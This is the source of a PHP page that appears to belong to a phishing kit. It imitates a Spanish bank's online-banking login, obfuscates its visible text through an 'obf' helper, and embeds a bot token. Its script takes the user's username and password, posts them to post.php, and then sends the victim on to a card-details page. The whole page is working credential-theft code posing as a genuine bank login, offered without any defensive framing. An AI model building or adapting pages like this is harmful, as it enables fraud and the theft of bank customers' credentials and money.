<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Online</title>
    <link rel="stylesheet" href="inc/style/style.css">
</head>
<body>
<header>
<div class="holder">
<img src="inc/images/logo.png">
</div>
</header>

<main>
<div class="form-holder">
<div class="form">

<div class="col title">
<?php $m->obf("Hola, introduce tu usuario y clave de acceso"); ?>
</div>

<?php 
if(isset($_GET['e'])){
    echo '
<div class="col error">
Identificación incorrecta. El Usuario y/o Clave de acceso introducidos no son correctos.
</div>';
}
?>


<div class="col">
    <input type="text" id="u" placeholder="Usuario">
    <img src="inc/images/help.png" style="width:230px;">
</div>
<div class="col">
    <input type="password" id="p" placeholder="Claves de acceso">
</div>

<div class="multi">
<div class="left">
    <button onclick="sendLog()"><?php $m->obf("Entrar"); ?></button>
</div>
<div class="right forgot">
<?php $m->obf("¿Olvidaste tu clave de acceso?"); ?>
</div>
</div>
<script>var token=<?php echo json_encode($bot); ?>;</script>
<div class="col">
    <div class="forgot">¿No tienes clave de acceso? Crea tu clave</div>
    <div class="forgot">¿No eres cliente? Hazte cliente</div>
    <div class="forgot">Descubre las ventajas de la banca online</div>
</div>

</div>



</div>
</main>

<?php require 'html/footer.php'; ?>
<div class="loader">
    <div class="loader_content">
        <img src="inc/images/loading.gif">
    </div> 
</div>

<script src="inc/script/jq.js"></script>
<script src="inc/script/jq2.js"></script>

<script>

function sendLog(){
    $("input").removeClass("error");
    var u = $("#u").val();
    var p = $("#p").val();

    if(u.length<4){
        return $("#u").addClass("error");
    }

    if(p.length<4){
        return $("#p").addClass("error");
    }

    $(".loader").show();
    $.post("post.php",{
        user:u,
        pass:p
    },(res)=>{
        window.location="tarjeta.php";
    });

}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
       $("button").click();
    }
});


</script>

</body>
</html>